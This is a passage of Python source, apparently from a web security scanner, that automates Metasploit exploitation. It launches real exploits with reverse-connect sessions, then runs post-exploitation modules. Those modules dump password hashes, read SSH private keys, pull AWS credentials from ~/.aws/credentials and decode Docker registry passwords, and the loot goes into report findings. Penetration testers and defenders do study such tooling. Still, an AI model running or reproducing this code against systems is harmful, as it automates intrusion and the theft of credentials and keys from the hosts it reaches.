            "TARGETURI": _extract_path(target),
            "LHOST":     self.lhost,
            "LPORT":     self.lport,
        }
        opts.update(extra)
        return opts

    def get_all_sessions(self) -> List[MeterpreterSession]:
        """
        Return all currently active sessions as MeterpreterSession objects.

        Returns
        -------
        List[MeterpreterSession]
        """
        sessions: List[MeterpreterSession] = []
        for raw_sess in self._client.list_sessions():
            sess_id = raw_sess.get("id") or raw_sess.get("session_id")
            if sess_id is None:
                continue
            sess_type = raw_sess.get("type") or raw_sess.get("session_type") or "meterpreter"
            sessions.append(MeterpreterSession(self._client, str(sess_id), sess_type))
        return sessions

    def kill_session(self, session_id: str) -> bool:
        """
        Terminate an active session by ID.

        Parameters
        ----------
        session_id : str — session identifier.

        Returns
        -------
        bool — True if kill request was acknowledged.
        """
        try:
            result = self._client._api(f"sessions/{session_id}/stop", {})
            if result is not None:
                logger.info(f"[FullExploitExecutor] Session {session_id} terminated.")
                return True
        except Exception as exc:
            logger.debug(f"[FullExploitExecutor] kill_session error: {exc!r}")
        return False


# ---------------------------------------------------------------------------
# MSFPostExploitRunner
# ---------------------------------------------------------------------------

class MSFPostExploitRunner:
    """
    Runs Metasploit post-exploitation modules on an active session.

    Modules used:
    - post/multi/recon/local_exploit_suggester
    - post/multi/gather/env
    - post/multi/gather/ssh_creds
    - post/multi/gather/aws_keys
    - post/multi/manage/shell_to_meterpreter
    - post/windows/gather/credentials/credential_collector
    - post/linux/gather/hashdump
    - post/multi/gather/docker_creds

    SRP: solely responsible for orchestrating post-exploitation modules.
    OCP: new modules added without changing existing method signatures.
    """

    def run_all(self, session: MeterpreterSession) -> Dict[str, Any]:
        """
        Run all applicable post-exploitation modules on the session.

        The method gracefully skips modules that fail or are not applicable.

        Parameters
        ----------
        session : MeterpreterSession — active session.

        Returns
        -------
        Dict[str, Any] — aggregated post-exploit intelligence.
        """
        results: Dict[str, Any] = {
            "session_id":       session.session_id,
            "session_type":     session.session_type,
            "sysinfo":          {},
            "local_exploits":   [],
            "environment":      {},
            "ssh_keys":         [],
            "aws_keys":         [],
            "hashes":           [],
            "docker_creds":     [],
            "errors":           [],
        }

        # Always gather sysinfo first
        try:
            results["sysinfo"] = session.get_system_info()
        except Exception as exc:
            results["errors"].append(f"sysinfo: {exc!r}")

        # Suggest local privilege escalation exploits
        try:
            results["local_exploits"] = self.suggest_local_exploits(session)
        except Exception as exc:
            results["errors"].append(f"local_exploits: {exc!r}")

        # Gather environment variables
        try:
            results["environment"] = self.gather_environment(session)
        except Exception as exc:
            results["errors"].append(f"environment: {exc!r}")

        # Gather SSH private keys
        try:
            results["ssh_keys"] = self.gather_ssh_keys(session)
        except Exception as exc:
            results["errors"].append(f"ssh_keys: {exc!r}")

        # Gather AWS credentials
        try:
            results["aws_keys"] = self.gather_aws_keys(session)
        except Exception as exc:
            results["errors"].append(f"aws_keys: {exc!r}")

        # Dump password hashes (requires elevated privileges)
        try:
            results["hashes"] = self.dump_hashes(session)
        except Exception as exc:
            results["errors"].append(f"hashes: {exc!r}")

        # Gather Docker credentials
        try:
            results["docker_creds"] = self._gather_docker_creds(session)
        except Exception as exc:
            results["errors"].append(f"docker_creds: {exc!r}")

        logger.info(
            f"[MSFPostExploitRunner] session={session.session_id}  "
            f"local_exploits={len(results['local_exploits'])}  "
            f"ssh_keys={len(results['ssh_keys'])}  "
            f"hashes={len(results['hashes'])}"
        )
        return results

    def suggest_local_exploits(self, session: MeterpreterSession) -> List[str]:
        """
        Run post/multi/recon/local_exploit_suggester and return suggested modules.

        Parameters
        ----------
        session : MeterpreterSession

        Returns
        -------
        List[str] — MSF module paths suggested for local privilege escalation.
        """
        raw = self._run_post_module(session, "post/multi/recon/local_exploit_suggester")
        suggestions: List[str] = []
        output = raw.get("output") or raw.get("result") or ""
        for line in str(output).splitlines():
            line = line.strip()
            if "exploit/" in line:
                # Extract module path from lines like: "[+] exploit/linux/local/..."
                parts = line.split()
                for part in parts:
                    if part.startswith("exploit/"):
                        suggestions.append(part.rstrip(","))
                        break
        return suggestions

    def gather_environment(self, session: MeterpreterSession) -> Dict:
        """
        Collect environment variables via post/multi/gather/env.

        Parameters
        ----------
        session : MeterpreterSession

        Returns
        -------
        Dict[str, str] — environment variable name -> value.
        """
        raw = self._run_post_module(session, "post/multi/gather/env")
        env: Dict[str, str] = {}
        output = raw.get("output") or raw.get("result") or ""
        for line in str(output).splitlines():
            if "=" in line:
                key, _, value = line.partition("=")
                env_key = key.strip()
                if env_key:
                    env[env_key] = value.strip()
        return env

    def gather_ssh_keys(self, session: MeterpreterSession) -> List[str]:
        """
        Collect SSH private keys via post/multi/gather/ssh_creds.

        Parameters
        ----------
        session : MeterpreterSession

        Returns
        -------
        List[str] — PEM-encoded private key strings found on the system.
        """
        raw = self._run_post_module(session, "post/multi/gather/ssh_creds")
        keys: List[str] = []
        output = raw.get("output") or raw.get("result") or ""
        # Module may report file paths — read them directly
        for line in str(output).splitlines():
            line = line.strip()
            if line.endswith("id_rsa") or line.endswith("id_ecdsa") or line.endswith("id_ed25519"):
                key_content = session.execute(f"cat {line} 2>/dev/null")
                if key_content and "PRIVATE KEY" in key_content:
                    keys.append(key_content)
            elif "BEGIN" in line and "PRIVATE KEY" in line:
                keys.append(line)

        # Also try standard locations directly
        for path in ("~/.ssh/id_rsa", "~/.ssh/id_ecdsa", "~/.ssh/id_ed25519"):
            content = session.execute(f"cat {path} 2>/dev/null")
            if content and "PRIVATE KEY" in content and content not in keys:
                keys.append(content)

        return keys

    def gather_aws_keys(self, session: MeterpreterSession) -> List[Dict]:
        """
        Collect AWS credentials via post/multi/gather/aws_keys.

        Parameters
        ----------
        session : MeterpreterSession

        Returns
        -------
        List[Dict] — each entry: {access_key, secret_key, region, profile}.
        """
        raw = self._run_post_module(session, "post/multi/gather/aws_keys")
        aws_creds: List[Dict] = []

        # Parse module output
        output = raw.get("output") or raw.get("result") or ""
        current: Dict[str, str] = {}
        for line in str(output).splitlines():
            line = line.strip()
            if "aws_access_key_id" in line.lower():
                _, _, val = line.partition("=")
                current["access_key"] = val.strip()
            elif "aws_secret_access_key" in line.lower():
                _, _, val = line.partition("=")
                current["secret_key"] = val.strip()
            elif "region" in line.lower():
                _, _, val = line.partition("=")
                current["region"] = val.strip()
            elif line.startswith("[") and line.endswith("]"):
                if current:
                    aws_creds.append(current)
                    current = {}
                current["profile"] = line[1:-1]

        if current:
            aws_creds.append(current)

        # Fallback: read ~/.aws/credentials directly
        if not aws_creds:
            cred_content = session.execute("cat ~/.aws/credentials 2>/dev/null")
            if cred_content:
                import re
                profile_re = re.compile(r"^\[(.+)\]$", re.M)
                access_re  = re.compile(r"aws_access_key_id\s*=\s*([A-Z0-9]{20})", re.I)
                secret_re  = re.compile(r"aws_secret_access_key\s*=\s*([A-Za-z0-9/+=]{40})", re.I)
                profiles   = profile_re.findall(cred_content)
                access_keys = access_re.findall(cred_content)
                secret_keys = secret_re.findall(cred_content)
                for i, ak in enumerate(access_keys):
                    sk = secret_keys[i] if i < len(secret_keys) else ""
                    profile = profiles[i] if i < len(profiles) else "default"
                    aws_creds.append({
                        "access_key": ak,
                        "secret_key": sk,
                        "profile":    profile,
                        "region":     "",
                    })

        return aws_creds

    def dump_hashes(self, session: MeterpreterSession) -> List[Dict]:
        """
        Dump password hashes using OS-appropriate post module.

        Uses post/linux/gather/hashdump on Linux targets and
        post/windows/gather/credentials/credential_collector on Windows.

        Parameters
        ----------
        session : MeterpreterSession

        Returns
        -------
        List[Dict] — hash entries with username/hash/algorithm keys.
        """
        sysinfo = session.get_system_info()
        os_type = sysinfo.get("os", "").lower()

        if "windows" in os_type:
            raw = self._run_post_module(
                session,
                "post/windows/gather/credentials/credential_collector",
            )
        else:
            raw = self._run_post_module(session, "post/linux/gather/hashdump")

        # Also try built-in hashdump
        hashdump_results = session.hashdump()
        if hashdump_results:
            return hashdump_results

        # Parse module output if hashdump() returned nothing
        hashes: List[Dict] = []
        output = raw.get("output") or raw.get("result") or ""
        for line in str(output).splitlines():
            line = line.strip()
            if ":" in line and not line.startswith("["):
                parts = line.split(":")
                if len(parts) >= 2:
                    hashes.append({
                        "username":  parts[0],
                        "hash":      ":".join(parts[1:]),
                        "algorithm": "ntlm" if "windows" in os_type else "shadow",
                    })
        return hashes

    def _run_post_module(
        self,
        session: MeterpreterSession,
        module: str,
        options: Optional[Dict[str, Any]] = None,
    ) -> Dict:
        """
        Execute a Metasploit post-exploitation module on the given session.

        Parameters
        ----------
        session : MeterpreterSession — target session.
        module  : str — MSF post module path (e.g. "post/multi/gather/env").
        options : Dict — additional module options.

        Returns
        -------
        Dict — raw MSF API response, or empty dict on failure.
        """
        opts: Dict[str, Any] = {"SESSION": session.session_id}
        if options:
            opts.update(options)

        try:
            result = session._client._api("modules/execute", {
                "module_type": "post",
                "module_name": module,
                "data_store":  opts,
            })
            if result is None:
                return {}
            logger.debug(f"[MSFPostExploitRunner] {module} on session {session.session_id}: done")
            return result if isinstance(result, dict) else {}
        except Exception as exc:
            logger.debug(f"[MSFPostExploitRunner] _run_post_module error ({module}): {exc!r}")
            return {}

    def _gather_docker_creds(self, session: MeterpreterSession) -> List[Dict]:
        """
        Collect Docker credentials via post/multi/gather/docker_creds.

        Parameters
        ----------
        session : MeterpreterSession

        Returns
        -------
        List[Dict] — {registry, username, password} entries.
        """
        raw = self._run_post_module(session, "post/multi/gather/docker_creds")
        creds: List[Dict] = []
        output = raw.get("output") or raw.get("result") or ""

        # Parse tabular output from the module
        for line in str(output).splitlines():
            line = line.strip()
            if not line or line.startswith("-") or line.startswith("["):
                continue
            parts = [p.strip() for p in line.split("|") if p.strip()]
            if len(parts) >= 3:
                creds.append({
                    "registry": parts[0],
                    "username": parts[1],
                    "password": parts[2],
                })

        # Fallback: read ~/.docker/config.json
        if not creds:
            docker_cfg = session.execute("cat ~/.docker/config.json 2>/dev/null")
            if docker_cfg:
                try:
                    import base64
                    cfg = json.loads(docker_cfg)
                    auths = cfg.get("auths", {})
                    for registry, auth_data in auths.items():
                        encoded = auth_data.get("auth", "")
                        if encoded:
                            try:
                                decoded = base64.b64decode(encoded).decode(errors="replace")
                                user, _, pwd = decoded.partition(":")
                            except Exception:
                                user, pwd = "", encoded
                            creds.append({
                                "registry": registry,
                                "username": user,
                                "password": pwd,
                            })
                except (json.JSONDecodeError, Exception) as exc:
                    logger.debug(f"[MSFPostExploitRunner] docker config.json parse error: {exc!r}")

        return creds


# ---------------------------------------------------------------------------
# MetasploitIntegration — updated run() with exploit_mode and post-exploit
# ---------------------------------------------------------------------------

# Patch MetasploitIntegration.run with enhanced version supporting exploit_mode
_original_msf_run = MetasploitIntegration.run


def _enhanced_msf_run(
    self: MetasploitIntegration,
    target: str,
    **kwargs: Any,
) -> "ToolResult":
    """
    Extended run() supporting exploit_mode and post-exploitation.

    Additional kwargs
    -----------------
    exploit_mode : str — "check" (default) | "exploit" | "full"
    lhost        : str — required for "exploit"/"full" mode
    lport        : int — defaults to 4444
    cve_ids      : List[str]
    """
    exploit_mode: str = kwargs.get("exploit_mode", "check")
    lhost: str = kwargs.get("lhost", "")
    lport: int = int(kwargs.get("lport", 4444))
    cve_ids: List[str] = kwargs.get("cve_ids", [])

    # Always run standard check first
    base_result: ToolResult = _original_msf_run(self, target, **kwargs)

    if exploit_mode == "check" or not lhost:
        return base_result

    if not self.is_available():
        return base_result

    executor = FullExploitExecutor(self._client, lhost=lhost, lport=lport)
    post_runner = MSFPostExploitRunner()
    sessions_obtained: List[MeterpreterSession] = []
    post_findings: List[ToolFinding] = []

    exploitable_cves = [
        f.cve_ids[0] for f in base_result.findings
        if f.cve_ids and f.verified
    ] or cve_ids

    for cve_id in exploitable_cves:
        logger.info(f"[MetasploitIntegration] Attempting real exploit for {cve_id} against {target}")
        session = executor.execute_exploit(cve_id, target)
        if session is None:
            continue

        sessions_obtained.append(session)
        logger.info(f"[MetasploitIntegration] Session obtained: {session.session_id}")

        if exploit_mode == "full":
            post_data = post_runner.run_all(session)
            new_findings = _integrate_session_with_post_exploit(session, target, post_data)
            post_findings.extend(new_findings)

    if sessions_obtained:
        base_result.extra["sessions"] = [
            {"id": s.session_id, "type": s.session_type}
            for s in sessions_obtained
        ]
    if post_findings:
        base_result.findings.extend(post_findings)

    return base_result


MetasploitIntegration.run = _enhanced_msf_run  # type: ignore[method-assign]


def _integrate_session_with_post_exploit(
    session: MeterpreterSession,
    target: str,
    post_data: Dict[str, Any],
) -> List[ToolFinding]:
    """
    Convert post-exploitation intelligence into WebSecure ToolFinding objects.

    Parameters
    ----------
    session   : MeterpreterSession — the source session.
    target    : str — original target URL.
    post_data : Dict — output from MSFPostExploitRunner.run_all().

    Returns
    -------
    List[ToolFinding] — new findings ready for the report.
    """
    findings: List[ToolFinding] = []

    # Hashes found
    hashes = post_data.get("hashes", [])
    if hashes:
        hash_text = "\n".join(
            f"{h.get('username','')}:{h.get('hash','')}"
            for h in hashes
        )
        findings.append(ToolFinding(
            title="Credential Hashes Extracted via Metasploit Session",
            severity=ToolSeverity.CRITICAL,
            url=target,
            tool="metasploit",
            description=(
                f"Post-exploitation: {len(hashes)} password hashes extracted "
                f"from session {session.session_id}."
            ),
            evidence=hash_text[:1000],
            tags=["post-exploit", "credentials", "hashdump", "metasploit"],
            verified=True,
            confidence="high",
        ))

    # SSH keys found
    ssh_keys = post_data.get("ssh_keys", [])
    if ssh_keys:
        findings.append(ToolFinding(
            title="SSH Private Keys Extracted via Metasploit Session",
            severity=ToolSeverity.CRITICAL,
            url=target,
            tool="metasploit",
            description=(
                f"Post-exploitation: {len(ssh_keys)} SSH private key(s) found "
                f"on session {session.session_id}."
            ),
            evidence=ssh_keys[0][:500] + ("..." if len(ssh_keys[0]) > 500 else ""),
            tags=["post-exploit", "ssh-keys", "metasploit"],
            verified=True,
            confidence="high",
        ))

    # AWS keys found
    aws_keys = post_data.get("aws_keys", [])
    if aws_keys:
        findings.append(ToolFinding(
            title="AWS Credentials Extracted via Metasploit Session",
            severity=ToolSeverity.CRITICAL,
            url=target,
            tool="metasploit",
            description=(
                f"Post-exploitation: {len(aws_keys)} AWS credential set(s) found "
                f"on session {session.session_id}."
            ),
            evidence=json.dumps(aws_keys[:2], indent=2)[:800],
            tags=["post-exploit", "aws-keys", "metasploit", "cloud"],
            verified=True,
            confidence="high",
        ))

    # Local privilege escalation suggestions
    local_exploits = post_data.get("local_exploits", [])
    if local_exploits:
        findings.append(ToolFinding(
            title="Local Privilege Escalation Vectors Identified",
            severity=ToolSeverity.HIGH,
            url=target,
            tool="metasploit",
            description=(
                f"Post-exploitation: local_exploit_suggester found {len(local_exploits)} "
                f"potential local privesc modules."
            ),
            evidence="\n".join(local_exploits[:10]),
            tags=["post-exploit", "privesc", "local-exploit", "metasploit"],
            verified=True,
            confidence="medium",
        ))

    return findings


def check_cves_with_metasploit(
    target: str,
    cve_ids: List[str],
    msf_host: str = "127.0.0.1",
    msf_port: int = 55553,
    msf_pass: str = "msf",
) -> List[Dict[str, Any]]:
    """
    CVE listesini Metasploit ile kontrol et, doğrulanmış bulguları döndür.

    Döndürür
    --------
    List[Dict] — WebSecure native finding formatında doğrulanmış bulgular.
    """
    integration = MetasploitIntegration(
        host=msf_host, port=msf_port, password=msf_pass
    )
    if not integration.is_available():
        return []
    result = integration.run(target, cve_ids=cve_ids)
    return [f.to_dict() for f in result.findings]


__all__ = [
    "MetasploitRPCClient",
    "MetasploitIntegration",
    "MeterpreterSession",
    "MSFCommandRunner",
    "FullExploitExecutor",
    "MSFPostExploitRunner",
    "check_cves_with_metasploit",
    "_CVE_TO_MODULE",
    "_MODULE_TO_PAYLOAD",
]
